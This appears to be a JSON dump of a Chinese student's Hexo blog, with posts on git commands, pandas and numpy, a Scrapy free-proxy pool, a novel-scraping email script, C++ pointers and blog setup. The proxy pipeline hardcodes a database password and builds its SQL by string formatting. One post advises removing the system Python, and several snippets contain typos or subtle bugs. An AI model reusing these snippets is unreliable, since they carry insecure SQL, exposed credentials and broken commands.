'Accept-Language':\"zh-CN,zh;q=0.9,en;q=0.8\", 'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36', 'Cookie': 'appver=1.5.0.75771', 'Referer': 'http://music.163.com/'&#125;url = \"https://music.163.com/weapi/v1/resource/comments/R_SO_4_32785700?csrf_token=\"raw = requests.post(url,headers=headers, data=data)print(raw.json()) 解析json，获取评论","categories":[],"tags":[]},{"title":"git简单指令","slug":"git简单指令","date":"2018-12-25T01:02:58.000Z","updated":"2020-06-30T12:29:17.396Z","comments":true,"path":"2018/12/25/git简单指令/","link":"","permalink":"http://yoursite.com/2018/12/25/git简单指令/","excerpt":"","text":"git简单指令首先放一张学习路线 1、创建版本库123mkdir huzai //创建一个空目录cd huzai //进入此目录git init //初始化git仓库 2、添加文件到版本库12git add file //将文件添加到缓存区git commit -m \"post message\" //提交并附带提交信息 3、版本回退123git reset --hard HEAD^ //HEAD是一个指针，指向当前的版本,^代表上一代版本，HEAD^^代表上两代git reflog //查询每次提交的commit_idgit reset --hard commit_id //根据id进行回退 4、管理修改1git diff HEAD -- file //查看工作区（file）与最新版本（HEAD）的区别 5、撤销修改1234git checkout -- file //直接丢弃工作区的修改（可用于恢复误删的文件）//对于已经添加到缓存的修改git reset HEAD file //撤销缓存区的修改git checkout -- file 6、删除文件123rm file //删除本地文件git rm file //删除版本库中的文件git commit -m \"post delete\" //提交删除事务 7、连接远程仓库1234567//先生成连接密钥ssh-kengen -t rsa -C username//将id_rsa.pub中的内容复制到github的密钥管理中//再根据github的提示将本地仓库与远程仓库进行关联git remote add origin git@github.com:username/repository//再推送master分支的所有内容到远程仓库git push -u origin master 8、从远程仓库进行下载1git clone git@github.com:username/repository 9、创建新的分支并切换到该分支下123git checkout -b branchname //创建并切换git branch branch_name //创建git checkout branch_name //切换 10、合并指定分支到当前分支1git merge branch_name 11、删除分支1git branch -d branch_name 12、如果合并时出现冲突12cat conflic_filename//git 会用&lt;&lt;&lt;&lt;&lt; ===== &gt;&gt;&gt;&gt;&gt;&gt;显示不同分支的内容，你则需要手动解决冲突 13、分支管理策略master分支应该是非常稳定的，也就是用于发布最新版本的，平时不应该在上面干活，干活都应该在dev分支上也就是说dev分支是不稳定的，到了某个时候将dev分支合并到master分支上，你和你的小伙伴应该在各自的分支上干活，然后推送到dev分支上 14、bug分支1234git add now_filegit stash //保护现场//这里修改buggit stash pop //提取现场，继续工作 15、丢弃一个没有被合并的分支1git branch -D branch_name 16、多人协作 1、尝试git push origin branch_name 2、如果推送失败，说明远程分支比你的版本新，则你git pull 拉取远程文件 3、合并你两的分支，如果有冲突则手动解决问题 4、重复1 注：如果git pull 提示 no tracking information 则说明远程分支和本地分支没有关联用下面的命令进行关联1git branch --set-uostream-to branch_name origin/branch_name 或者你不知道有什么分支123git remote -v //查看远程仓库的信息git checkout -b branch_name origin/branch_name //创建本地分支以及远程分支git branch --set-upstream-to branch_name origin/branch_name //进行关联","categories":[],"tags":[{"name":"git","slug":"git","permalink":"http://yoursite.com/tags/git/"}]},{"title":"数据分析-pandas","slug":"数据分析-pandas","date":"2018-12-25T00:21:06.000Z","updated":"2020-06-30T12:29:17.399Z","comments":true,"path":"2018/12/25/数据分析-pandas/","link":"","permalink":"http://yoursite.com/2018/12/25/数据分析-pandas/","excerpt":"","text":"数据分析—-pandas核心数据结构 Series &amp; DataFrame123import pandas as pdimport numpy as npfrom pandas import Series, DataFrame Series是一个定长的字典序列，它有两个基本属性index 、 value index 默认是 0 ,1,2,3 递增的，也可以自己指定索引 index=[‘a’, ‘b’, ‘c’]创建Series的三种方式1234567x1 = Series([1,2,3,4])x2 = Series(data=[1,2,3,4],index=['a','b','c','d'])dic = &#123;'a':1,'b':2,'c':3,'d':4&#125;x3 = Series(dic)print(x1)print(x2)print(x3) 0 1 1 2 2 3 3 4 dtype: int64 a 1 b 2 c 3 d 4 dtype: int64 a 1 b 2 c 3 d 4 dtype: int64 DataFrame类似数据库中的表，可以将其看成是由有相同的索引的Series组成创建DataFra几种方式123data = &#123;\"chinese\":[90,80,70,60,50],'math':[70,80,70,90,60],'english':[30,50,70,80,60]&#125;df1 = DataFrame(data=data,index=['zhangfei','guanyu','zhaoyun','huangzhong','machao'])print(df) chinese english math zhangfei 90 30 70 guanyu 80 50 80 zhaoyun 70 70 70 huangzhong 60 80 90 machao 50 60 60 123import xlrddf2 = DataFrame(pd.read_excel('datas/grades.xlsx'))df2 = df2.drop_duplicates() 1print(df2) 姓名 高数 英语 C++ 0 蒋广佳 43 69 61 1 廖菲 80 64 62 2 沈秀玲 68 74 98 3 韦丹 48 53 64 4 张梦雅 72 73 96 5 赵雅欣 60 63 70 6 曹海广 74 60 20 7 陈泽灿 38 21 92 8 邓杰 88 67 84 9 高海亮 86 74 96 10 顾晓冬 84 60 90 11 侯星宇 64 69 96 12 江宜哲 60 33 70 13 李洪汀 76 56 84 14 梁杨杨 68 54 94 15 刘辉 68 63 98 16 罗嘉豪 39 44 56 17 施亚君 90 63 90 18 孙添 64 63 78 19 王杰 74 60 76 20 王泽 52 48 94 21 徐孟圆 60 69 74 22 杨福程 70 49 76 23 尤澳晨 91 67 86 24 翟佳 78 73 88 25 张旭 100 60 98 26 支星哲 80 63 100 27 邹湘涛 54 40 90 数据清洗删除不必要的行或列123#删除行df2 = df2.drop(columns=['姓名'])print(df2) 高数 英语 C++ 0 43 69 61 1 80 64 62 2 68 74 98 3 48 53 64 4 72 73 96 5 60 63 70 6 74 60 20 7 38 21 92 8 88 67 84 9 86 74 96 10 84 60 90 11 64 69 96 12 60 33 70 13 76 56 84 14 68 54 94 15 68 63 98 16 39 44 56 17 90 63 90 18 64 63 78 19 74 60 76 20 52 48 94 21 60 69 74 22 70 49 76 23 91 67 86 24 78 73 88 25 100 60 98 26 80 63 100 27 54 40 90 123#删除列df2 = df2.drop(index = [27])print(df2) 高数 英语 C++ 0 43 69 61 1 80 64 62 2 68 74 98 3 48 53 64 4 72 73 96 5 60 63 70 6 74 60 20 7 38 21 92 8 88 67 84 9 86 74 96 10 84 60 90 11 64 69 96 12 60 33 70 13 76 56 84 14 68 54 94 15 68 63 98 16 39 44 56 17 90 63 90 18 64 63 78 19 74 60 76 20 52 48 94 21 60 69 74 22 70 49 76 23 91 67 86 24 78 73 88 25 100 60 98 26 80 63 100 重命名列名1df2 = df2.rename(columns=&#123;'高数':'math','英语':'english'&#125;) 去除重复的值1df2 = df2.drop_duplicates() 更改数据格式12df2['math'] = df2['math'].astype('str')#df2['math'].astype(np.int64) 清除数据间的空格12df2['math'] = df2['math'].map(str.strip) #删除左右两边的空格df2['math'] = df2['math'].map(str.lstrip) #删除左边的空格（str.rstrip 右边的空格） 删除指定字符1df2['math'] = df2['math'].str.strip('$') 大小写转换1df2.columns = df2.columns.str.upper() #全部大写（lower（）全部小写 title（）首字母大写） 1df2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } MATH ENGLISH C++ 0 43 69 61 1 80 64 62 2 68 74 98 3 48 53 64 4 72 73 96 5 60 63 70 6 74 60 20 7 38 21 92 8 88 67 84 9 86 74 96 10 84 60 90 11 64 69 96 12 60 33 70 13 76 56 84 14 68 54 94 15 68 63 98 16 39 44 56 17 90 63 90 18 64 63 78 19 74 60 76 20 52 48 94 21 60 69 74 22 70 49 76 23 91 67 86 24 78 73 88 25 100 60 98 26 80 63 100 使用apply函数对数据进行清洗123#df2['MATH'] = df2['MATH'].apply(str.lower)df2['MATH'] = df2['MATH'].astype(np.int64)df2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } MATH ENGLISH C++ 0 43 69 61 1 80 64 62 2 68 74 98 3 48 53 64 4 72 73 96 5 60 63 70 6 74 60 20 7 38 21 92 8 88 67 84 9 86 74 96 10 84 60 90 11 64 69 96 12 60 33 70 13 76 56 84 14 68 54 94 15 68 63 98 16 39 44 56 17 90 63 90 18 64 63 78 19 74 60 76 20 52 48 94 21 60 69 74 22 70 49 76 23 91 67 86 24 78 73 88 25 100 60 98 26 80 63 100 1234def plus(df): df['Total'] = df['MATH']+df['ENGLISH']+df['C++'] return dfdf2 = df2.apply(plus,axis=1) 1print(df2) MATH ENGLISH C++ Total 0 43 69 61 173 1 80 64 62 206 2 68 74 98 240 3 48 53 64 165 4 72 73 96 241 5 60 63 70 193 6 74 60 20 154 7 38 21 92 151 8 88 67 84 239 9 86 74 96 256 10 84 60 90 234 11 64 69 96 229 12 60 33 70 163 13 76 56 84 216 14 68 54 94 216 15 68 63 98 229 16 39 44 56 139 17 90 63 90 243 18 64 63 78 205 19 74 60 76 210 20 52 48 94 194 21 60 69 74 203 22 70 49 76 195 23 91 67 86 244 24 78 73 88 239 25 100 60 98 258 26 80 63 100 243 pandas中常用的统计函数 1print(df2.describe()) MATH ENGLISH C++ Total count 27.000000 27.000000 27.000000 27.000000 mean 69.444444 59.703704 81.148148 210.296296 std 16.113380 12.406000 17.933003 34.410212 min 38.000000 21.000000 20.000000 139.000000 25% 60.000000 55.000000 72.000000 193.500000 50% 70.000000 63.000000 86.000000 216.000000 75% 80.000000 68.000000 95.000000 239.500000 max 100.000000 74.000000 100.000000 258.000000 12","categories":[],"tags":[{"name":"数据分析","slug":"数据分析","permalink":"http://yoursite.com/tags/数据分析/"}]},{"title":"数据分析----numpy ","slug":"数据分析-numpy","date":"2018-12-22T23:21:29.000Z","updated":"2020-06-30T12:29:17.399Z","comments":true,"path":"2018/12/23/数据分析-numpy/","link":"","permalink":"http://yoursite.com/2018/12/23/数据分析-numpy/","excerpt":"","text":"数据分析—numpy12import pandas as pdimport numpy as np 创建普通数组12a = np.array([1,2,3])b = np.array([[1,2,3],[4,5,6],[7,8,9]]) 1b[1,1] = 10 1234print(a.shape)print(b.shape)print(a.dtype)print(b) (3,) (3, 3) int64 [[1 2 3] [4 5 6] [7 8 9]] 创建结构数组1234567personalType = np.dtype(&#123; 'names':['name','age','chinese','math','english'], 'formats':['S25','i','i','i','f']&#125;)students = np.array([(\"huzai\",22,99,99,99.5),(\"huzai\",22,99,99,99.5)],dtype=personalType)age = students[:]['age']print(np.mean(age)) 22.0 1print(students) [(b&apos;huzai&apos;, 22, 99, 99, 99.5) (b&apos;huzai&apos;, 22, 99, 99, 99.5)] 创建连续数组12x1 = np.arange(1,11,2) #步长为2，从1开始的等差数组(不包括终值)x2 = np.linspace(1,9,5) #将1-9分成5块，结果如上 12print(x1)print(x2) [1 3 5 7 9] [1. 3. 5. 7. 9.] 数组间的算数运算1234print(np.add(x1,x2))print(np.subtract(x1,x2))print(np.multiply(x1,x2))print(np.divide(x1,x2)) [ 2. 6. 10. 14. 18.] [0. 0. 0. 0. 0.] [ 1. 9. 25. 49. 81.] [1. 1. 1. 1. 1.] 统计函数数组中的最值 np.amin() amax()1234a = np.array([[1,3,7],[2,5,8],[6,4,9]])print(np.amin(a))print(np.amin(a,0)) #每一列的最小值print(np.amin(a,1)) #每行的最小值 1 [1 3 7] [1 2 4] 统计最大值与最小值之差 ptp()123print(np.ptp(a))print(np.ptp(a,0)) #每列最大值与最小值的差print(np.ptp(a,1)) #每行最大值与最小值的差 8 [5 2 2] [6 6 5] 统计数组的百分位数 percentile(a, p, axis) a:数组名 p 代表百分比 axis代表是行还是列123print(np.percentile(a,50))print(np.percentile(a,50,0))print(np.percentile(a,50,1)) 5.0 [2. 4. 8.] [3. 5. 6.] 统计数组中的中位数以及平均数 median() mean()123print(np.median(a))print(np.median(a,0))print(np.median(a,1)) 5.0 [2. 4. 8.] [3. 5. 6.] 数组中的加权平均值 average(a,weights)1234b = np.array([1,2,3,4])wts = np.array([1,2,3,4])print(np.average(b))print(np.average(b,weights=wts)) 2.5 3.0 统计数组中的标准差（std（））与方差（var（））12print(np.std(b))print(np.var(b)) 1.118033988749895 1.25 Numpy排序123print(a)print(np.sort(a))print(np.sort(a,0)) [[1 3 7] [2 5 8] [6 4 9]] [[1 3 7] [2 5 8] [4 6 9]] [[1 3 7] [2 4 8] [6 5 9]] 作业题123456st_type = np.dtype(&#123; 'names':['name','chinese','english','math'], 'formats':['S25','i','i','i']&#125;)grades = np.array([('zhangfei',66,65,30),('guanyu',95,85,98),('zhaoyun',93,92,96),('huangzhong',90,88,77), ('dianwei',80,90,90)],dtype=st_type) 1print(grades) [(b&apos;zhangfei&apos;, 66, 65, 30) (b&apos;guanyu&apos;, 95, 85, 98) (b&apos;zhaoyun&apos;, 93, 92, 96) (b&apos;huangzhong&apos;, 90, 88, 77) (b&apos;dianwei&apos;, 80, 90, 90)] 1234chinese = grades[:]['chinese'] english = grades[:]['english']math = grades[:]['math']total = np.add(chinese,english,math) 1print(total) [131 180 185 178 170] 1c_a,e_a,m_a = np.average(chinese),np.average(english),np.average(math) 1print(c_a) 84.8 12","categories":[],"tags":[{"name":"数据分析","slug":"数据分析","permalink":"http://yoursite.com/tags/数据分析/"}]},{"title":"小说更新后发送邮箱的问题解决","slug":"小说更新后发送邮箱的问题解决","date":"2018-11-23T08:54:00.000Z","updated":"2020-06-30T12:29:17.397Z","comments":true,"path":"2018/11/23/小说更新后发送邮箱的问题解决/","link":"","permalink":"http://yoursite.com/2018/11/23/小说更新后发送邮箱的问题解决/","excerpt":"","text":"遇到的问题 先上一张图，看一下问题在哪 从图上我们可以看到，虽然小说是每天发两次给我，但是有时候会漏掉一章，有时候又会重复发一章，这都是小说作者不按时更新惹的祸啊！！！既然小说作者的习惯改变不了，那就完善自我吧! 新的思路，加一个“缓存”缓存是什么意思呢？ 本地建一个名为origin.txt的文本文件，每次爬取完成后与origin.txt里面的内容对比一下。 如果一样则不发送。 如果不一样就发送，并且将最新的内容保存到origin.txt文件中，作为下一次的对照。 演示效果 再origin.txt里写入test，然后启动我们可以看到，origin文件已被重新写入，并且新的文本已经发送到邮箱 再次启动，也就是还没跟新的情况我们看到，提示消息，这里不会跟新origin，也不会发送邮件 还遗留的问题 如果作者一下爆发怎么办（一分钟更新十章！）思考一下，其实原理差不多，缓存大小不同罢了！有兴趣的可以尝试一下！项目源码已发布在githubhttps://github.com/huzai9527/fictionSend","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"c++指针问题","slug":"c-指针问题","date":"2018-11-19T08:27:20.000Z","updated":"2020-06-30T12:29:17.395Z","comments":true,"path":"2018/11/19/c-指针问题/","link":"","permalink":"http://yoursite.com/2018/11/19/c-指针问题/","excerpt":"","text":"指针究竟是什么 指针是一类特殊的变量，他保存的不是一般数据的值，而是程序中另一对象在内存中的地址我们先通过一个小程序看一看指针如何工作1234567891011#include &lt;iostream&gt;using namespace std;int main()&#123; int n = 123,m = 456; int *p = &amp;n; cout&lt;&lt;\"&amp;n:\"&lt;&lt;&amp;n&lt;&lt;endl; cout&lt;&lt;\"&amp;p:\"&lt;&lt;&amp;p&lt;&lt;endl; cout&lt;&lt;\" p:\"&lt;&lt;p&lt;&lt;endl; cout&lt;&lt;\"*p:\"&lt;&lt;*p&lt;&lt;endl; return 0;&#125; 从运行结果可以看出下面几点： p本身是有一个地址的且地址为 &amp;p p的值是另一个变量n的地址 &amp;n *p所表示的意思是地址为 p 的内存中所存的值 n 即本段程序中共涉及到2个地址，一个是 n 的地址，一个是 p 的地址,我们用一张图来表示他们的关系指针的初始化 被具有相同类型的对象初始化 12int i = 10;int *p = &amp;i; 由另一个同一类型的指针初始化,这时两个指针指向同一地址空间 1int *p1 = p; 通过直接分配内存地址得到初值 1int *p2 = new int; 指针也可以没有类型，通用指针的定义,这样的指针可以指向任一对象 1void *p3 指针的运算符定义指针的目的事通过指针变量间接的访问变量 *:取指针值运算符。通过指针所指内存单元的地址间接的访问对应的存储单元。若指针变量p指向变量a，则 *p的运算结果为变量a的值 &amp;:取地址运算符。返回变量对应的存储单元地址，若a为int变量，p为int型指针变量，则 p = &amp;a表示将a的存储单元地址赋给p。用一个程序验证一下： 12345678910111213#include &lt;iostream&gt;using namespace std;int main()&#123; int a = 100; int *p,*p1,*q; p = &amp;a; p1 = p; q = NULL; cout&lt;&lt;\"a=\"&lt;&lt;a&lt;&lt;\",\"&lt;&lt;\"*p=\"&lt;&lt;*p&lt;&lt;\",\"&lt;&lt;\"p=\"&lt;&lt;p&lt;&lt;endl; *p1 = 200; cout&lt;&lt;\"a=\"&lt;&lt;a&lt;&lt;\",\"&lt;&lt;\"*p=\"&lt;&lt;*p&lt;&lt;\",\"&lt;&lt;\"p=\"&lt;&lt;p&lt;&lt;endl; cout&lt;&lt;\"*p1=\"&lt;&lt;*p1&lt;&lt;\",\"&lt;&lt;\"p1=\"&lt;&lt;p1&lt;&lt;endl;&#125; 运行结果 指针与数组的关系 数组名和指针在引用数组元素和取他们的地址方面可以相互转换，但两者有一个重要的不同点 数组是在定义时就分配好内存空间的，因此数组名是一个地址常量，在程序中不能将数组名作为变量为其赋值，而指针是一个变量，可以多次赋值我们通过一个程序看一下他们的关系 1234567891011121314#include &lt;iostream&gt;using namespace std;int main()&#123;int a[10]=&#123;1,2,3,4,5,6,7,8,9,10&#125;;int *pa = a;int i = 3;cout&lt;&lt;\"a[i] :\"&lt;&lt;a[i]&lt;&lt;endl;cout&lt;&lt;\"*(pa+i):\"&lt;&lt;*(pa+i)&lt;&lt;endl;cout&lt;&lt;\"*(a+i) :\"&lt;&lt;*(a+i)&lt;&lt;endl;cout&lt;&lt;\"&amp;a[i] :\"&lt;&lt;&amp;a[i]&lt;&lt;endl;cout&lt;&lt;\"a+i :\"&lt;&lt;a+i&lt;&lt;endl;cout&lt;&lt;\"pa+i :\"&lt;&lt;pa+i&lt;&lt;endl; &#125; 运行结果 易重要的和易混淆的概念 为什么要对指针初始化？定义了指针变量后，系统会为其分配一个内存空间，若没有赋值则此内存区域的内容是随机的，也就是指针随机指向一个内存单元。你想想如果你对一个随机的内存空间进行写操作，会怎样！ 指针的运算指针 + 整数 = 指针指针 - 指针 = 整数 //同类行的指针相减表示两个基类型变量的个数指针 + 指针 = ？？？？ //不可以 new、 new[]、 delete、 delete[]有什么区别 1234int *p = new int(3) // 为p分配了一个整形变量的存储区域并初始化为3int *p1 = new int[20] // 分配20个整形变量的区域给p1delete p //释放有new申请的空间delete[] p1 //释放由new[]申请的空间 c++程序中动态分配的内存不会被自动释放 指针函数和函数指针含义相同吗？完全不同！指针函数：若一个函数返回的是一个地址，则称该函数为指针函数。格式是 数据类型 函数名（参数列表）函数指针：指针变量指向一个函数的入口地址，格式为 数据类型 （函数指针变量）（参数列表）函数指针的用法：12345678910111213141516#include &lt;iostream&gt;using namespace std;int cul(int (*pf)(int,int), int x, int y)&#123; return pf(x,y);&#125;int add(int x,int y)&#123; return x+y;&#125;int sub(int x,int y)&#123; return x-y;&#125;int main()&#123; int a=10,b=20; cout&lt;&lt;a&lt;&lt;\"+\"&lt;&lt;b&lt;&lt;\"=\"&lt;&lt;cul(add,a,b)&lt;&lt;endl; cout&lt;&lt;a&lt;&lt;\"-\"&lt;&lt;b&lt;&lt;\"=\"&lt;&lt;cul(sub,a,b);&#125; 常量指针、指针常量、指向常量的指针常量有什么区别常量指针：表示指针指向的是一个常量，格式：const 类型 指针变量 或 类型 const 指针变量1234int i;const int *p = &amp;i;*p = 10; //错误i = 10; //正确 指针常量：表示所定义的指针是一个常量，只能在定义的时候初始化123int i,j;int * const p = &amp;i;p = &amp;j;//错误 指向常量的指针常量：格式为 const 类型 * const 指针常量12345int i,j;const int * const p = &amp;i;*p = 10;//错误p = &amp;j;//错误i = 10;//正确","categories":[],"tags":[{"name":"c++","slug":"c","permalink":"http://yoursite.com/tags/c/"}]},{"title":"scrapy构建自己的ip代理池","slug":"scrapy构建自己的ip代理池","date":"2018-11-18T09:33:13.000Z","updated":"2020-06-30T12:29:17.397Z","comments":true,"path":"2018/11/18/scrapy构建自己的ip代理池/","link":"","permalink":"http://yoursite.com/2018/11/18/scrapy构建自己的ip代理池/","excerpt":"","text":"用scrapy爬取可用的代理分析免费代理网站的结构 我爬取了三个字段：IP、port、type分析要爬取的数据，编写items.py 因此在items.py中，建立相应的字段1234567import scrapyclass IproxyItem(scrapy.Item): # define the fields for your item here like: # name = scrapy.Field() ip = scrapy.Field() type = scrapy.Field() port = scrapy.Field() 爬取所有的免费ip 在spider目录下，创建IpSpider.py12345678910111213import scrapyimport Iproxy.itemsclass IpSpider(scrapy.Spider): name = 'IpSpider' allowed_domains = ['xicidaili.com'] start_urls = ['http://www.xicidaili.com/'] def parse(self, response): item = Iproxy.items.IproxyItem() item['ip'] = response.css('tr td:nth-child(2)::text').extract() item['port'] = response.css('tr td:nth-child(3)::text').extract() item['type'] = response.css('tr td:nth-child(6) ::text').extract() yield item 检测是否可用，如果可用则存入数据库 因为是免费的ip，所以我们有必要检测一下他是否可用，对于可用的就存入数据库，反之则丢弃 检测处理数据在pipeline.py中编写 检测原理，通过代理访问百度，如果能够访问，则说明可用1234567891011121314151617181920212223242526272829303132333435363738394041# -*- coding: utf-8 -*-# Define your item pipelines here## Don't forget to add your pipeline to the ITEM_PIPELINES setting# See: https://doc.scrapy.org/en/latest/topics/item-pipeline.htmlimport pymysqlimport requestsclass IproxyPipeline(object): def process_item(self, item, spider): print('@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@') db = pymysql.connect(\"localhost\", \"root\", \"168168\", \"spider\") cursor = db.cursor() for i in range(1, len(item['ip'])): ip = item['ip'][i] + ':' + item['port'][i] try: if self.proxyIpCheck(ip) is False: print('此ip：'+ip+\"不能用\") continue else: print('此ip：'+ip+'可用，存入数据库！') sql = 'insert into proxyIp value (\"%s\")' % (ip) cursor.execute(sql) db.commit() except: db.rollback() db.close() return item def proxyIpCheck(self, ip): proxies = &#123;'http': 'http://' + ip, 'https': 'https://' + ip&#125; try: r = requests.get('https://www.baidu.com/', proxies=proxies, timeout=1) if (r.status_code == 200): return True else: return False except: return False 运行情况 可以看出还是有好多ip不能用的 可用的存在数据库","categories":[],"tags":[{"name":"python scrapy 爬虫","slug":"python-scrapy-爬虫","permalink":"http://yoursite.com/tags/python-scrapy-爬虫/"}]},{"title":"python爬取最新更新的小说并发送到你的邮箱","slug":"python爬取最新更新的小说并发送到你的邮箱","date":"2018-11-17T07:07:29.000Z","updated":"2020-06-30T12:29:17.397Z","comments":true,"path":"2018/11/17/python爬取最新更新的小说并发送到你的邮箱/","link":"","permalink":"http://yoursite.com/2018/11/17/python爬取最新更新的小说并发送到你的邮箱/","excerpt":"","text":"数据获取—Spider()找目标网站，该网站是你看小说的网站，分析该网站的结构方便你对内容的抓取 这里我获取最新章节的时间、标题以及标题的连接 这里获取内容 编写spider方法，确定他的返回值，这里我返回的是一个list，包括更新的时间、标题、内容 方法中需要导入的包 requests bs4 re 12345678910111213141516171819202122def spider(): list = [] response = requests.get('https://www.xbiquge6.com/13_13134/') response.encoding = ('utf-8') html = response.text html = BeautifulSoup(html, 'html.parser') time = html.select('div#info p:nth-of-type(3)').__getitem__(0).text[5:] title = html.select('div#info p:nth-of-type(4) a[href]').__getitem__(0).text href = html.select('div#info p:nth-of-type(4) a[href]').__getitem__(0) # print(title) pattern = re.compile(r'href=\"(.+?)\"') href = re.findall(pattern, href.__str__()).__getitem__(0) href = \"https://www.xbiquge6.com\" + href response = requests.get(href) response.encoding = ('utf-8') html = BeautifulSoup(response.text, 'html.parser') content = html.select('div#content') # print(content) list.append(title) list.append(content) list.append(time) return list 邮件发送—smtp()首先先在你的邮箱中设置打开smtp服务比如我的QQ邮箱，先进入邮箱-&gt;点击设置-&gt;点击账户-&gt;下滑找到smtp服务-&gt;点击开启服务-&gt;生成授权码（就是你在smtp方法中用到的password）![PCO_6AO93%@2W$B}GFGHI0 (1).png 编写smtp方法，向我的邮箱发送小说，确定返回值是bool类型，成功为True，失败为False12345678910111213141516def mail(): list = spider(); ret = True try: mail_msg = list.__getitem__(1).__str__() msg = MIMEText(mail_msg, 'html', 'utf-8') msg['From'] = formataddr(['huzai', my_sender]) msg['To'] = formataddr(['huzai', receiver]) msg['Subject'] = list.__getitem__(0) server = smtplib.SMTP_SSL('smtp.qq.com', 465) server.login(my_sender, my_pwd) server.sendmail(my_sender, [receiver], msg.as_string()) server.quit() except Exception: ret = False return ret 上传脚本到服务器使用xftp将写好的smtp.py上传到你的云服务器上直接拖进去就行 这里注意保证你的服务器上的python版本和你本机一致，且需要的包已经安装 如果你的服务器上的版本是2.*的可以运行下面代码安装python3123sudo apt-get remove pythonsudo apt-get install python3sudo apt autoremove 用xshell进入服务器试着运行 在服务器端设置定时执行确保你安装了crontab（ubuntu默认安装）cron命名解析：执行的时间 + 执行的用户 + 执行的命令 查看原有的cron1cat /etc/crontab 编辑你的程序1sudo nano /etc/crontab 编写你的命令，每天14:58给我发送邮件，这里根据你看的小说的更新时间设置，一天几更在大约什么时间等等158 14 * * * root python3 smtp.py 编辑好了再次查看cron是否已经写入，我这里已经写入重启crontab服务1service cron restart 静静的等待14:58的到来，查看邮箱 邮件收到了最新更新的哦","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"github+hexo搭建个人博客","slug":"github-hexo搭建个人博客","date":"2018-11-11T09:46:19.000Z","updated":"2020-06-30T12:29:17.396Z","comments":true,"path":"2018/11/11/github-hexo搭建个人博客/","link":"","permalink":"http://yoursite.com/2018/11/11/github-hexo搭建个人博客/","excerpt":"","text":"1.创建的项目名默认为 用户名.github.io,创建时点击生成readme文件，方便后面添加说明 2.在本地创建一个文件夹，我是在E盘创建的blog，推荐用vscode作为编辑器，在编辑器里面打开文件夹，打开Terminer 3.使用hexo初始化文件夹，这一步会产生很多的hexo配置文件，我们先不管，先跑起来 4.运行hexo server打开服务，看看本地能不能显示运行后访问url，如果看到如图就成功了 5.配置文件中填写git的配置信息，按照如下格式填写 6.打开文件夹，右键git bash here 7.输入cd ~/.ssh，进入ssh文件夹 8.配置git中的用户名和邮箱 9.生成ssh密钥 10.在github的项目中加入密钥 11.测试密钥链接是否成功 12.测试成功后再再编辑器中运行hexo clean hexo g hexo d 这样就算上传成功 13.访问你的博客，看到之前再本地运行的界面，就行了","categories":[],"tags":[{"name":"github","slug":"github","permalink":"http://yoursite.com/tags/github/"}]}]}